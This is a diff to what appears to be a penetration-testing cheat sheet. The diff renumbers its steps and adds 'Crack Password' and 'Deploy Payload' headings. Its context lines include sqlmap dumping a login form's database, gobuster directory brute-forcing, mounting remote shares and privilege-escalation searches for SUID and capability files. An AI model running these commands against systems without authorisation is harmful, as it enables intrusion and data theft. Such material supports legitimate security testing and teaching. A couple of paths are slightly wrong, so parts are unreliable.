@@ -22,7 +22,9 @@ $gobuster -u http://example.com -x php.txt,html -w /usr/share/dirb/wordlists/big
 
 $sqlmap -u http://Target_IP/login.php --forms --dump
 
-# 4° Gain Access
+# 4° Crack Password
+
+# 5° Gain Access
 
 http://example.com/login
 
@@ -44,7 +46,7 @@ $sudo mount -o rw <Target_IP>:/backup /tmp/dir-target
 
 $sudo mount -t cifs -o username=user_name //<Target_IP>/share_name /mnt/dir-target
 
-# 4° Search Priv-Esc
+# 6° Search Priv-Esc
 
 $cat /etc/proc/version
 
@@ -71,6 +73,8 @@ $getcap -r / 2>/dev/null
 $find / -perm -o w -type d 2>/dev/null
 
 $find / -perm -u=s -type f 2>/dev/null
+
+# 7° Deploy Payload
 
 $find / -name perl* python* gcc* 2>/dev/nul
 
